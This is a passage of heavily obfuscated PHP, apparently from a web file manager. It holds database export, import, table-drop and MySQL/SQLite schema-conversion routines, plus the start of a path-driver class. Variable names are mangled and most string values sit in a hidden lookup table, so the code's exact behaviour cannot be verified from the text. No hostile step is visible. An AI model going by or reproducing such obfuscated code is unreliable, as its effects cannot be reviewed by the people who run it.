($Òñû‘ğ ) { preg_match($İ²âÎí™[1150], $Ì¥âè§È, $¡Óààû³); $å¡‚ÆúÄ->task[$İ²âÎí™[1151]] = $¡Óààû³[1]; $å¡‚ÆúÄ->update(1); } } } public function insertTable($˜©òêÔò, &$¹í˜¯çÌ) { $øî¢ëµ‹ =& $_SERVER[²Ö÷öõ]; $Ïİä÷Œ¥ = $this->model()->db(); $³÷Öàî½ = $ƒç™üôğ ? array($ƒç™üôğ) : $Ïİä÷Œ¥->getTables(); foreach ($˜©òêÔò as $„ñªˆ¯) { $ƒç™üôğ = basename($„ñªˆ¯, $øî¢ëµ‹[871]); if (!in_array($ƒç™üôğ, $³÷Öàî½)) { continue; } $¹í˜¯çÌ->task[$øî¢ëµ‹[1151]] = $ƒç™üôğ; if (get_filesize($„ñªˆ¯) == 0) { continue; } $´¦Îœ«¹ = $this->sqlToDb($„ñªˆ¯, $¹í˜¯çÌ); if (!$´¦Îœ«¹) { ActionCall($øî¢ëµ‹[1146], !0, 0); show_json(LNG($øî¢ëµ‹[1152]) . "\x5b{$ƒç™üôğ}\x5d", !1); } } } public function sqlFromDb($õ¥­ûÜĞ, $õ€ÏŞŸó, &$É¡†–µ½, $½ìúÊ«í = '') { if ($É¡†–µ½) { $É¡†–µ½->task[$_SERVER[²Ö÷öõ][1151]] = $õ¥­ûÜĞ; } $¹Ñß¿­Î = $this->model($õ¥­ûÜĞ); $äôŠøÄà = 0; $óã‚Ûğ« = 0; $»½ÊÚ¢– = 10000; $ëÌ­íÇ° = fopen($õ€ÏŞŸó, $_SERVER[²Ö÷öõ][1153]); $ÜÊÔÏìÁ = $¹Ñß¿­Î->getPk(); $óƒ“Ïƒ‹ = $¹Ñß¿­Î->getDbFields(); $Œ®éÆ°· = $_SERVER[²Ö÷öõ][12]; if ($GLOBALS[$_SERVER[²Ö÷öõ][870]] && in_array($õ¥­ûÜĞ, array($_SERVER[²Ö÷öõ][1154], $_SERVER[²Ö÷öõ][1155]))) { $Œ®éÆ°· = $õ¥­ûÜĞ; } do { $Û«²—½ = array($ÜÊÔÏìÁ => array($_SERVER[²Ö÷öõ][1100], $óã‚Ûğ«)); $µ°•Í• = $¹Ñß¿­Î->where($Û«²—½)->field($óƒ“Ïƒ‹)->order($ÜÊÔÏìÁ . $_SERVER[²Ö÷öõ][1156])->limit($»½ÊÚ¢–)->select(); $µ°•Í• = !empty($µ°•Í•) ? $µ°•Í• : array(); if (!($´ÙÑ’÷á = count($µ°•Í•))) { break; } $¾è‘Ì‡í = end($µ°•Í•); $óã‚Ûğ« = $¾è‘Ì‡í[$ÜÊÔÏìÁ]; $âÎ†ñäÒ = array(); foreach ($µ°•Í• as $¸ŞÔÜüµ) { if ($Œ®éÆ°·) { if ($õ¥­ûÜĞ == $_SERVER[²Ö÷öõ][1154]) { if ($¸ŞÔÜüµ[$_SERVER[²Ö÷öõ][33]] == $_SERVER[²Ö÷öõ][1157]) { $À•Íşº‘ = json_decode($¸ŞÔÜüµ[$_SERVER[²Ö÷öõ][450]], !0); if ($À•Íşº‘[$_SERVER[²Ö÷öõ][32]] == $GLOBALS[$_SERVER[²Ö÷öõ][870]] && $À•Íşº‘[$_SERVER[²Ö÷öõ][833]] != 1) { continue; } } } else { if ($¸ŞÔÜüµ[$_SERVER[²Ö÷öõ][33]] == $_SERVER[²Ö÷öõ][1158] && $¸ŞÔÜüµ[$_SERVER[²Ö÷öõ][97]] == $_SERVER[²Ö÷öõ][865]) { continue; } } } if ($½ìúÊ«í) { $¸ŞÔÜüµ[$_SERVER[²Ö÷öõ][87]] = "\173\151\157\72{$½ìúÊ«í}\175" . substr($¸ŞÔÜüµ[$_SERVER[²Ö÷öõ][87]], strlen("\x7b\151\157\x3a{$¸ŞÔÜüµ[$_SERVER[²Ö÷öõ][900]]}\x7d")); $¸ŞÔÜüµ[$_SERVER[²Ö÷öõ][900]] = $½ìúÊ«í; } $âÎ†ñäÒ[] = $_SERVER[²Ö÷öõ][1159] . $this->sqlEncode($¸ŞÔÜüµ) . $_SERVER[²Ö÷öõ][1160]; } $Ÿ´Êª’ = "\111\116\123\105\122\x54\x20\x49\116\x54\x4f\x20\140{$õ¥­ûÜĞ}\140\40\50\x60" . implode($_SERVER[²Ö÷öõ][1161], $óƒ“Ïƒ‹) . $_SERVER[²Ö÷öõ][1162]; fwrite($ëÌ­íÇ°, $Ÿ´Êª’ . implode($_SERVER[²Ö÷öõ][1163], $âÎ†ñäÒ) . $_SERVER[²Ö÷öõ][74] . PHP_EOL); $äôŠøÄà += $´ÙÑ’÷á; if ($É¡†–µ½) { $É¡†–µ½->update($´ÙÑ’÷á); } } while ($»½ÊÚ¢– == $´ÙÑ’÷á); fclose($ëÌ­íÇ°); return $äôŠøÄà; } public function sqlToDb($¶ÂŸŠ†Ó, &$¾Ä»“Î) { $ƒş¿°™¶ =& $_SERVER[²Ö÷öõ]; $ÍÃÃÃÃ = $this->model()->db(); $ˆàæİÒ´ = @fopen($¶ÂŸŠ†Ó, $ƒş¿°™¶[1164]); if (!$ˆàæİÒ´) { return !1; } $„ª•ô²¶ = 0; $š˜ËÖ”¬ = $ƒş¿°™¶[12]; $”şùä‚è = array(); $¡›¦¯Ûü = $this->dbType(); $ÉÀûø²ê = $¡›¦¯Ûü == $ƒş¿°™¶[13] ? 500 : 2000; $äÇ¬âıİ = basename($¶ÂŸŠ†Ó, $ƒş¿°™¶[871]); $˜­İÓïĞ = 0; $ÍàƒĞï® = 4194304; while (!feof($ˆàæİÒ´)) { $ô³œ …¹ = trim(fgets($ˆàæİÒ´)); if (!$ô³œ …¹) { continue; } $Êäúá›· = $this->sqlDecode($ô³œ …¹, $¡›¦¯Ûü, $äÇ¬âıİ); if (stripos($Êäúá›·, $ƒş¿°™¶[431]) === 0) { if (!$š˜ËÖ”¬) { $š˜ËÖ”¬ = $Êäúá›· . $ƒş¿°™¶[53]; } continue; } if ($¾Ä»“Î) { $¾Ä»“Î->task[$ƒş¿°™¶[1149]] += 1; } $„ª•ô²¶++; $”şùä‚è[] = rtrim(rtrim(trim($Êäúá›·), $ƒş¿°™¶[50]), $ƒş¿°™¶[74]); $ïÙÏâÑÕ = null; $„ÍŸÚ¥Â = strlen($Êäúá›·); $˜­İÓïĞ += $„ÍŸÚ¥Â; $ãˆõ‚ßß = strlen($š˜ËÖ”¬) + $˜­İÓïĞ + (count($”şùä‚è) - 1); if ($ãˆõ‚ßß >= $ÍàƒĞï®) { $ïÙÏâÑÕ = array_pop($”şùä‚è); if ($„ª•ô²¶ > 1) { $„ª•ô²¶--; } } if ($„ª•ô²¶ >= $ÉÀûø²ê || $ïÙÏâÑÕ) { $Êäúá›· = $š˜ËÖ”¬ . implode($ƒş¿°™¶[50], $”şùä‚è); if (!$ÍÃÃÃÃ->execute($Êäúá›·)) { return !1; } if ($¾Ä»“Î) { $¾Ä»“Î->update($„ª•ô²¶); } $”şùä‚è = array(); $„ª•ô²¶ = 0; $˜­İÓïĞ = 0; if ($ïÙÏâÑÕ) { $”şùä‚è = array($ïÙÏâÑÕ); $„ª•ô²¶ = 1; $˜­İÓïĞ = $„ÍŸÚ¥Â; } } } fclose($ˆàæİÒ´); if (!empty($”şùä‚è)) { $Êäúá›· = $š˜ËÖ”¬ . implode($ƒş¿°™¶[50], $”şùä‚è); if (!$ÍÃÃÃÃ->execute($Êäúá›·)) { return !1; } if ($¾Ä»“Î) { $¾Ä»“Î->update($„ª•ô²¶); } } return !0; } public function dropTable($­“øº´Õ = null) { $Â‡Ï†ã = $this->model()->db(); $à«Ââñ” = $­“øº´Õ ? array($­“øº´Õ) : $Â‡Ï†ã->getTables(); if (!$à«Ââñ”) { return; } foreach ($à«Ââñ” as $­“øº´Õ) { if ($­“øº´Õ) { $­“øº´Õ = strtolower($­“øº´Õ); } else { continue; } $Â‡Ï†ã->execute("\144\x72\157\160\x20\x74\141\142\154\x65\40\151\146\x20\145\x78\151\163\164\x73\40\x60{$­“øº´Õ}\x60"); } } private function sqlEncode($äØ·ŞÂÍ) { $¥à¶Ë–õ =& $_SERVER[²Ö÷öõ]; $ä¥ı¨µÊ = array(); foreach ($äØ·ŞÂÍ as $¥É›ô»©) { if (is_array($¥É›ô»©)) { $¥É›ô»© = json_encode_force($¥É›ô»©); } $¥É›ô»© = addslashes($¥É›ô»©); $¥É›ô»© = str_replace(array($¥à¶Ë–õ[1165], $¥à¶Ë–õ[262], $¥à¶Ë–õ[418]), array($¥à¶Ë–õ[1166], $¥à¶Ë–õ[1167], $¥à¶Ë–õ[1168]), $¥É›ô»©); $ä¥ı¨µÊ[] = $¥É›ô»©; } return $¥à¶Ë–õ[58] . implode($¥à¶Ë–õ[1169], $ä¥ı¨µÊ) . $¥à¶Ë–õ[58]; } private function sqlDecode($µ¢Ë˜û°, $Ã¸Ôì×, $§àÍá¬¼ = '') { $³™£×Óƒ =& $_SERVER[²Ö÷öõ]; $µ¢Ë˜û° = str_replace(array($³™£×Óƒ[1166], $³™£×Óƒ[1167], $³™£×Óƒ[1168]), array($³™£×Óƒ[1165], $³™£×Óƒ[262], $³™£×Óƒ[418]), $µ¢Ë˜û°); if ($Ã¸Ôì× == $³™£×Óƒ[13]) { $µ¢Ë˜û° = str_ireplace($³™£×Óƒ[1170], $³™£×Óƒ[59], $µ¢Ë˜û°); $µ¢Ë˜û° = stripslashes($µ¢Ë˜û°); } return preg_replace($³™£×Óƒ[1171], $³™£×Óƒ[12], $µ¢Ë˜û°); if ($Ã¸Ôì× == $³™£×Óƒ[13]) { return $§àÍá¬¼ != $³™£×Óƒ[1172] ? stripslashes($µ¢Ë˜û°) : $µ¢Ë˜û°; } if ($§àÍá¬¼ == $³™£×Óƒ[1172]) { $µ¢Ë˜û° = str_replace($³™£×Óƒ[1173], $³™£×Óƒ[121], stripslashes($µ¢Ë˜û°)); } return $µ¢Ë˜û°; } public function getSqlFile($½ÛÃ…ÜË = '') { $½ÖÜâ·í =& $_SERVER[²Ö÷öõ]; $‚¶¼âŸ¡ = $this->dbType(!0); $á­º‹… = CONTROLLER_DIR . "\x69\156\163\164\141\154\154\57\144\x61\164\x61\x2f{$‚¶¼âŸ¡}\56\x73\x71\x6c"; $øË½×‡™ = file_get_contents($á­º‹…); $æ¾³üÒÄ = $½ÖÜâ·í[1174] . ($‚¶¼âŸ¡ == $½ÖÜâ·í[887] ? $½ÖÜâ·í[1175] : $½ÖÜâ·í[1176]) . $½ÖÜâ·í[1177]; preg_match_all($æ¾³üÒÄ, $øË½×‡™, $»š¹›ÀÜ); $Æìñùû = $»š¹›ÀÜ[1]; $äüÕŸëí = $this->model()->db(); $ˆ±€Ìœö = $äüÕŸëí->getTables(); $ƒí³€„ = TEMP_FILES . $½ÖÜâ·í[1178] . date($½ÖÜâ·í[272]) . $½ÖÜâ·í[8]; del_dir($ƒí³€„); mk_dir($ƒí³€„); $Ğ‘´à“® = $ƒí³€„ . $½ÖÜâ·í[1179]; $«Ô‰ïİ = $ƒí³€„ . $½ÖÜâ·í[1180]; $–ñèªßŞ = $‚¶¼âŸ¡ == $½ÖÜâ·í[13] ? $½ÖÜâ·í[887] : $½ÖÜâ·í[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\163\x74\141\154\154\57\x64\141\164\x61\57{$–ñèªßŞ}\x2e\x73\161\x6c", $ƒí³€„); @touch($ƒí³€„ . $‚¶¼âŸ¡ . $½ÖÜâ·í[871]); $Ğ×Š¹ÎÒ = fopen($Ğ‘´à“®, $½ÖÜâ·í[1153]); $ëúØÏü = fopen($«Ô‰ïİ, $½ÖÜâ·í[1153]); if ($‚¶¼âŸ¡ == $½ÖÜâ·í[13]) { $ˆ±€Ìœö = array_diff($ˆ±€Ìœö, array($½ÖÜâ·í[863], $½ÖÜâ·í[864])); $í‡Âàšø = array($½ÖÜâ·í[1181], $½ÖÜâ·í[1182], $½ÖÜâ·í[1183]); fwrite($ëúØÏü, implode(PHP_EOL, $í‡Âàšø) . PHP_EOL . PHP_EOL); foreach ($ˆ±€Ìœö as $³ò“î¼€) { $¹â™¬È¤ = $this->sqlFromSqlite($³ò“î¼€); if (!$¹â™¬È¤[$½ÖÜâ·í[13]]) { continue; } fwrite($ëúØÏü, $¹â™¬È¤[$½ÖÜâ·í[13]] . PHP_EOL . PHP_EOL); if (!in_array($³ò“î¼€, $Æìñùû)) { fwrite($Ğ×Š¹ÎÒ, $¹â™¬È¤[$½ÖÜâ·í[887]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ˆ±€Ìœö as $³ò“î¼€) { $¹â™¬È¤ = $this->sqlFromMysql($³ò“î¼€); if (!$¹â™¬È¤[$½ÖÜâ·í[887]]) { continue; } fwrite($Ğ×Š¹ÎÒ, $¹â™¬È¤[$½ÖÜâ·í[887]] . PHP_EOL . PHP_EOL); if (!in_array($³ò“î¼€, $Æìñùû)) { fwrite($ëúØÏü, $¹â™¬È¤[$½ÖÜâ·í[13]] . PHP_EOL . PHP_EOL); } } } fclose($Ğ×Š¹ÎÒ); fclose($ëúØÏü); $øË½×‡™ = array($½ÖÜâ·í[887] => $Ğ‘´à“®, $½ÖÜâ·í[13] => $«Ô‰ïİ); return $½ÛÃ…ÜË ? $øË½×‡™[$½ÛÃ…ÜË] : $øË½×‡™; } public function dbType($“¼½ª™µ = false) { $ŸÁ™‘¤ =& $_SERVER[²Ö÷öõ]; $Ô²ˆè¾ = $“¼½ª™µ ? $GLOBALS[$ŸÁ™‘¤[6]][$ŸÁ™‘¤[21]] : $this->database; $Ô²ˆè¾ = array_change_key_case($Ô²ˆè¾); $ÔéÆì÷ = $Ô²ˆè¾[$ŸÁ™‘¤[1053]]; if ($ÔéÆì÷ == $ŸÁ™‘¤[1050]) { $»ë¸Ô¥Ä = explode($ŸÁ™‘¤[4], $Ô²ˆè¾[$ŸÁ™‘¤[1059]]); $ÔéÆì÷ = $»ë¸Ô¥Ä[0]; } $±Åò‹¾ = array($ŸÁ™‘¤[1184] => $ŸÁ™‘¤[13], $ŸÁ™‘¤[998] => $ŸÁ™‘¤[887]); if (isset($±Åò‹¾[$ÔéÆì÷])) { $ÔéÆì÷ = $±Åò‹¾[$ÔéÆì÷]; } return $ÔéÆì÷; } public function sqlFromMysql($±Êé…, $ÄÅ¼üè = '') { $èƒ½˜íõ =& $_SERVER[²Ö÷öõ]; $†¹‘Úµë = $this->model()->db(); $Øš¦ÅÜ = $†¹‘Úµë->query($èƒ½˜íõ[1185] . $±Êé… . $èƒ½˜íõ[461]); if (!$Øš¦ÅÜ || !$Øš¦ÅÜ[0]) { return !1; } $ışŸÖŸ‚ = _get($Øš¦ÅÜ[0], $èƒ½˜íõ[1186], $èƒ½˜íõ[12]); if (!$ışŸÖŸ‚) { return !1; } $ìä™¢ = "\x44\x52\117\x50\40\124\101\x42\x4c\105\40\111\106\x20\x45\130\111\x53\x54\x53\40\140{$±Êé…}\140\x3b" . PHP_EOL . $ışŸÖŸ‚ . $èƒ½˜íõ[74]; if ($ÄÅ¼üè && $ÄÅ¼üè == $èƒ½˜íõ[887]) { return $ìä™¢; } $àúÜÑİû = array_change_key_case($GLOBALS[$èƒ½˜íõ[6]][$èƒ½˜íõ[21]]); $é×¬ô²× = $àúÜÑİû[$èƒ½˜íõ[1058]]; $à†€­äĞ = $èƒ½˜íõ[1187] . $é×¬ô²× . $èƒ½˜íõ[1188] . $±Êé… . $èƒ½˜íõ[58]; $âõ¤ƒ©¼ = $èƒ½˜íõ[1189] . $±Êé… . $èƒ½˜íõ[986]; $³‚É¼€ = $†¹‘Úµë->query($à†€­äĞ); if (empty($³‚É¼€)) { $ï¯ÊÆ¨ = array($èƒ½˜íõ[887] => $èƒ½˜íõ[12], $èƒ½˜íõ[13] => $èƒ½˜íõ[12]); return $ÄÅ¼üè ? $ï¯ÊÆ¨[$ÄÅ¼üè] : $ï¯ÊÆ¨; } $óúòÎĞæ = $†¹‘Úµë->query($âõ¤ƒ©¼); $ÅÔ½Ü©Æ = $èƒ½˜íõ[12]; $¡ÜŞÃˆ = array(); foreach ($óúòÎĞæ as $ú°áÇÑİ) { if (!$ÅÔ½Ü©Æ && $ú°áÇÑİ[$èƒ½˜íõ[1190]] == $èƒ½˜íõ[1191]) { $ÅÔ½Ü©Æ = $ú°áÇÑİ[$èƒ½˜íõ[1192]]; } if (isset($¡ÜŞÃˆ[$ú°áÇÑİ[$èƒ½˜íõ[1190]]])) { $¡ÜŞÃˆ[$ú°áÇÑİ[$èƒ½˜íõ[1190]]][$èƒ½˜íõ[1193]][] = $ú°áÇÑİ[$èƒ½˜íõ[1192]]; continue; } $¡ÜŞÃˆ[$ú°áÇÑİ[$èƒ½˜íõ[1190]]] = array($èƒ½˜íõ[1194] => $ú°áÇÑİ[$èƒ½˜íõ[1190]], $èƒ½˜íõ[1193] => array($ú°áÇÑİ[$èƒ½˜íõ[1192]]), $èƒ½˜íõ[1195] => $ú°áÇÑİ[$èƒ½˜íõ[1196]] == $èƒ½˜íõ[91] ? 0 : 1); } $»­´®©· = array(); foreach ($¡ÜŞÃˆ as $ú°áÇÑİ) { $çöÜª¦® = $ú°áÇÑİ[$èƒ½˜íõ[1194]] == $èƒ½˜íõ[1191]; $‚¶×…¦í = array($èƒ½˜íõ[1197], $ú°áÇÑİ[$èƒ½˜íõ[1195]] == $èƒ½˜íõ[91] && !$çöÜª¦® ? $èƒ½˜íõ[1198] : $èƒ½˜íõ[12], $èƒ½˜íõ[1199], $èƒ½˜íõ[1200] . $±Êé… . $èƒ½˜íõ[11] . ($çöÜª¦® ? $èƒ½˜íõ[1201] : $ú°áÇÑİ[$èƒ½˜íõ[1194]]) . $èƒ½˜íõ[121], $èƒ½˜íõ[1202], $èƒ½˜íõ[121] . $±Êé… . $èƒ½˜íõ[121], $èƒ½˜íõ[1203] . implode($èƒ½˜íõ[1204], $ú°áÇÑİ[$èƒ½˜íõ[1193]]) . $èƒ½˜íõ[1205]); $»­´®©·[] = implode($èƒ½˜íõ[53], $‚¶×…¦í) . $èƒ½˜íõ[74]; } $ªØŒ¾¢® = array(); $»úŸó°š = array($èƒ½˜íõ[1206] => $èƒ½˜íõ[1207], $èƒ½˜íõ[1207] => $èƒ½˜íõ[1207], $èƒ½˜íõ[364] => $èƒ½˜íõ[391], $èƒ½˜íõ[363] => $èƒ½˜íõ[391]); foreach ($³‚É¼€ as $ú°áÇÑİ) { $‚¶×…¦í = array($èƒ½˜íõ[121] . $ú°áÇÑİ[$èƒ½˜íõ[1208]] . $èƒ½˜íõ[121], isset($»úŸó°š[$ú°áÇÑİ[$èƒ½˜íõ[1209]]]) ? $»úŸó°š[$ú°áÇÑİ[$èƒ½˜íõ[1209]]] : $ú°áÇÑİ[$èƒ½˜íõ[1210]], $ú°áÇÑİ[$èƒ½˜íõ[1211]] == $èƒ½˜íõ[984] ? $èƒ½˜íõ[1212] : $èƒ½˜íõ[1213], $ú°áÇÑİ[$èƒ½˜íõ[1208]] == $ÅÔ½Ü©Æ ? $èƒ½˜íõ[1214] : $èƒ½˜íõ[12], $ú°áÇÑİ[$èƒ½˜íõ[1035]] ? strtoupper(str_replace($èƒ½˜íõ[11], $èƒ½˜íõ[12], $ú°áÇÑİ[$èƒ½˜íõ[1035]])) : $èƒ½˜íõ[12]); $ªØŒ¾¢®[] = trim(implode($èƒ½˜íõ[53], $‚¶×…¦í)); } $‡ãÊŠÉ’ = array($èƒ½˜íõ[1215] . $±Êé… . $èƒ½˜íõ[1216], $èƒ½˜íõ[1217] . $±Êé… . $èƒ½˜íõ[1218], implode($èƒ½˜íõ[50] . PHP_EOL, $ªØŒ¾¢®), $èƒ½˜íõ[1032]); $¬ÑÎîí¹ = implode(PHP_EOL, array_merge($‡ãÊŠÉ’, $»­´®©·)); if ($ÄÅ¼üè && $ÄÅ¼üè == $èƒ½˜íõ[13]) { return $¬ÑÎîí¹; } $ï¯ÊÆ¨ = array($èƒ½˜íõ[887] => $ìä™¢, $èƒ½˜íõ[13] => $¬ÑÎîí¹); return $ÄÅ¼üè ? $ï¯ÊÆ¨[$ÄÅ¼üè] : $ï¯ÊÆ¨; } public function sqlFromSqlite($§¯©¨€Ö, $ŒÁÖç‹ = '') { $Ç¶³ÄøÃ =& $_SERVER[²Ö÷öõ]; $Ù½¹°£ = $this->model()->db(); $„‰ù­ÈŸ = "\x50\x52\101\107\115\101\40\x54\101\102\114\x45\x5f\111\x4e\106\117\x20\50\x27{$§¯©¨€Ö}\47\51"; $ã¶ÌÜØç = "\x53\105\114\105\x43\124\40\52\x20\x46\122\117\x4d\40\x73\x71\x6c\x69\x74\x65\137\155\141\x73\x74\145\x72\40\127\110\x45\x52\x45\x20\164\x62\154\x5f\x6e\x61\155\145\x20\75\x20\x27{$§¯©¨€Ö}\47"; $Ìäš‡²ê = $Ù½¹°£->query($„‰ù­ÈŸ); if (empty($Ìäš‡²ê)) { $‹òâ …º = array($Ç¶³ÄøÃ[887] => $Ç¶³ÄøÃ[12], $Ç¶³ÄøÃ[13] => $Ç¶³ÄøÃ[12]); return $ŒÁÖç‹ ? $‹òâ …º[$ŒÁÖç‹] : $‹òâ …º; } $Â¡‹³ = $Ù½¹°£->query($ã¶ÌÜØç); $¨œ‡È¾ = $“€¼–æ = array(); foreach ($Â¡‹³ as $¤¢­»ñø) { if ($¤¢­»ñø[$Ç¶³ÄøÃ[33]] == $Ç¶³ÄøÃ[356]) { $¨œ‡È¾[] = $¤¢­»ñø[$Ç¶³ÄøÃ[1219]]; } else { $“€¼–æ[$¤¢­»ñø[$Ç¶³ÄøÃ[32]]] = $¤¢­»ñø[$Ç¶³ÄøÃ[1219]]; } } $œ³¼Ë¶« = array_merge(array($Ç¶³ÄøÃ[1215] . $§¯©¨€Ö . $Ç¶³ÄøÃ[121]), $¨œ‡È¾, array_values($“€¼–æ)); $œ³¼Ë¶« = implode($Ç¶³ÄøÃ[74] . PHP_EOL, $œ³¼Ë¶«) . $Ç¶³ÄøÃ[74]; if ($ŒÁÖç‹ && $ŒÁÖç‹ == $Ç¶³ÄøÃ[13]) { return $œ³¼Ë¶«; } $Îı®û³ = array(); $…ÑœÙä´ = array($Ç¶³ÄøÃ[1207] => $Ç¶³ÄøÃ[1220], $Ç¶³ÄøÃ[391] => $Ç¶³ÄøÃ[1221]); $‘ñ½åíÃ = $Ç¶³ÄøÃ[12]; foreach ($Ìäš‡²ê as $¤¢­»ñø) { if ($¤¢­»ñø[$Ç¶³ÄøÃ[57]] == $Ç¶³ÄøÃ[91]) { $‘ñ½åíÃ = $¤¢­»ñø[$Ç¶³ÄøÃ[32]]; } $ØØğåû® = array($Ç¶³ÄøÃ[461] . $¤¢­»ñø[$Ç¶³ÄøÃ[32]] . $Ç¶³ÄøÃ[461], isset($…ÑœÙä´[$¤¢­»ñø[$Ç¶³ÄøÃ[33]]]) ? $…ÑœÙä´[$¤¢­»ñø[$Ç¶³ÄøÃ[33]]] : $¤¢­»ñø[$Ç¶³ÄøÃ[33]], $¤¢­»ñø[$Ç¶³ÄøÃ[35]] == $Ç¶³ÄøÃ[91] ? $Ç¶³ÄøÃ[1212] : $Ç¶³ÄøÃ[1222] . $¤¢­»ñø[$Ç¶³ÄøÃ[56]], $¤¢­»ñø[$Ç¶³ÄøÃ[57]] == $Ç¶³ÄøÃ[91] ? $Ç¶³ÄøÃ[1223] : $Ç¶³ÄøÃ[12]); $Îı®û³[] = trim(implode($Ç¶³ÄøÃ[53], $ØØğåû®)); } foreach ($“€¼–æ as $ŞßÛÏºØ => $á»„Ş¸ö) { $µñÅÜŞ° = str_replace($Ç¶³ÄøÃ[1224] . $§¯©¨€Ö . $Ç¶³ÄøÃ[11], $Ç¶³ÄøÃ[12], $ŞßÛÏºØ); $ÎèˆÁï = str_replace(array($Ç¶³ÄøÃ[121], $Ç¶³ÄøÃ[1043]), $Ç¶³ÄøÃ[461], substr($á»„Ş¸ö, stripos($á»„Ş¸ö, $Ç¶³ÄøÃ[337]))); if ($µñÅÜŞ° == $Ç¶³ÄøÃ[1201]) { $åÈ‡öŸî = $Ç¶³ÄøÃ[1225] . $‘ñ½åíÃ . $Ç¶³ÄøÃ[1226]; } else { $åÈ‡öŸî = (stripos($µñÅÜŞ°, $Ç¶³ÄøÃ[11]) ? $Ç¶³ÄøÃ[1227] : $Ç¶³ÄøÃ[12]) . ($Ç¶³ÄøÃ[1228] . $µñÅÜŞ° . $Ç¶³ÄøÃ[1229] . $ÎèˆÁï); } $Îı®û³[] = $åÈ‡öŸî; } $õıø¶ì = array($Ç¶³ÄøÃ[1230] . $§¯©¨€Ö . $Ç¶³ÄøÃ[1231], $Ç¶³ÄøÃ[1232] . $§¯©¨€Ö . $Ç¶³ÄøÃ[1233], implode($Ç¶³ÄøÃ[50] . PHP_EOL, $Îı®û³), $Ç¶³ÄøÃ[1234]); $È–ôùì = implode(PHP_EOL, $õıø¶ì); if ($ŒÁÖç‹ && $ŒÁÖç‹ == $Ç¶³ÄøÃ[887]) { return $È–ôùì; } $‹òâ …º = array($Ç¶³ÄøÃ[887] => $È–ôùì, $Ç¶³ÄøÃ[13] => $œ³¼Ë¶«); return $ŒÁÖç‹ ? $‹òâ …º[$ŒÁÖç‹] : $‹òâ …º; } } goto CÑ÷äğ¬é; F®“•›äÛ¹: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Ë’†’) { $this->pathParse = $Ë’†’; $this->model = Model($_SERVER[²Ö÷öõ][1428]); } public function getPath($Ê³’¼ÁÓ) { return trim($Ê³’¼ÁÓ, $_SERVER[²Ö÷öõ][8]); } public function pathFather($ıÛ£Çá) { $ó··Ş¥± = $this->parse($ıÛ£Çá); $ó··Ş¥± = $this->infoSimple($ıÛ£Çá); return $ó··Ş¥± ? $ó··Ş¥±[$_SERVER[²Ö÷öõ][192]] : !1; } public function pathThis($òí®ùèî) { $£œ”äÒš = $this->infoSimple($òí®ùèî); return $£œ”äÒš ? $£œ”äÒš[$_SERVER[²Ö÷öõ][32]] : !1; } public function getPathOuter($øŒÓ€›ï) { if (!$øŒÓ€›ï) { return $øŒÓ€›ï; } $ë½•ˆ„ù = $this->parse($øŒÓ€›ï); return KodIO::make($ë½•ˆ„ù[$_SERVER[²Ö÷öõ][475]]); } public function copyFolderFromIO($ÚüÒÓ, $›­¼«Ã, $øú§ÊÇù, $¹ó™¸Ñ, $ÁÉİ® ) { $ÌˆŒÁŞå = $this->model->copyFolderFromIO($ÚüÒÓ, $›­¼«Ã, $øú§ÊÇù, $¹ó™¸Ñ, $ÁÉİ® ); return KodIO::make($ÌˆŒÁŞå); } public function isParentOf($Ò¥Ö×„, $†’¾¤¨) { return $this->model->isParentOf($Ò¥Ö×„, $†’¾¤¨); } public function mkfile($çòŸéï, $’Á³¯‚Ü = '', $á¤³æ¶¶ = REPEAT_RENAME) { $Şæ¤“¢ =& $_SERVER[²Ö÷öõ]; $Óí¤Ôô = $this->parse($çòŸéï); $çòŸéï = $Óí¤Ôô[$Şæ¤“¢[475]]; for ($‡³—îÖ± = 0; $‡³—îÖ± < count($Óí¤Ôô[$Şæ¤“¢[1429]]); $‡³—îÖ±++) { $¶ššïêÃ = $Óí¤Ôô[$Şæ¤“¢[1429]][$‡³—îÖ±]; if ($‡³—îÖ± == count($Óí¤Ôô[$Şæ¤“¢[1429]]) - 1) { $çòŸéï = $this->model->mkfile($çòŸéï, $¶ššïêÃ, $’Á³¯‚Ü, $á¤³æ¶¶); break; } $çòŸéï = $this->model->mkdir($çòŸéï, $¶ššïêÃ, REPEAT_SKIP); } return $this->getPathOuter($çòŸéï); } public function mkdir($¨¦Ñ¦ä», $™œëÃ­¥ = REPEAT_SKIP) { $‘³¹½ˆ =& $_SERVER[²Ö÷öõ]; $»¨ı¦ö€ = $this->parse($¨¦Ñ¦ä»); $¨¦Ñ¦ä» = $»¨ı¦ö€[$‘³¹½ˆ[475]]; for ($§½¿ş¦Ó = 0; $§½¿ş¦Ó < count($»¨ı¦ö€[$‘³¹½ˆ[1429]]); $§½¿ş¦Ó++) { $’õíŸşÖ = $»¨ı¦ö€[$‘³¹½ˆ[1429]][$§½¿ş¦Ó]; $¨¦Ñ¦ä» = $this->model->mkdir($¨¦Ñ¦ä», $’õíŸşÖ, $™œëÃ­¥); } return $this->getPathOuter($¨¦Ñ¦ä»); } public function copyFile($Œš°Ùí¼, $‰ü—é­…, $ù½¶½©¼ = REPEAT_REPLACE) { $üşŸıü† =& $_SERVER[²Ö÷öõ]; $ÇÅÇáË = $this->parse($‰ü—é­…); $Á½šòâ» = $this->model->copy($Œš°Ùí¼, $ÇÅÇáË[$üşŸıü†[475]], $ù½¶½©¼, $ÇÅÇáË[$üşŸıü†[87]]); return $Á½šòâ» ? $this->getPathOuter($Á½šòâ») : !1; } public function moveFile($ ãÂ÷Ú , $„Ú©¼¦¦, $Ø²«áäÊ = REPEAT_REPLACE) { $ÂêŒ“êë =& $_SERVER[²Ö÷öõ]; $Ôì€“› = $this->parse($„Ú©¼¦¦); $¾Àƒœˆ = $this->model->move($ ãÂ÷Ú , $Ôì€“›[$ÂêŒ“êë[475]], $Ø²«áäÊ, $Ôì€“›[$ÂêŒ“êë[87]]); return $¾Àƒœˆ ? $this->getPathOuter($¾Àƒœˆ) : !1; } public function copy($“Éàéß©, $øÎè‚ª, $‹Šƒ¹¡Ğ = REPEAT_REPLACE, $­ıÄªÁ = false) { $£‹™‰Ã‰ = $this->parse($øÎè‚ª); $çñòËÍ­ = $this->model->copy($“Éàéß©, $£‹™‰Ã‰[$_SERVER[²Ö÷öõ][475]], $‹Šƒ¹¡Ğ, $­ıÄªÁ); return $çñòËÍ­ ? $this->getPathOuter($çñòËÍ­) : !1; } public function moveSameAllow() { } public function move($á•Ìïè, $•Åôƒ, $ùã‘Æ“ò = 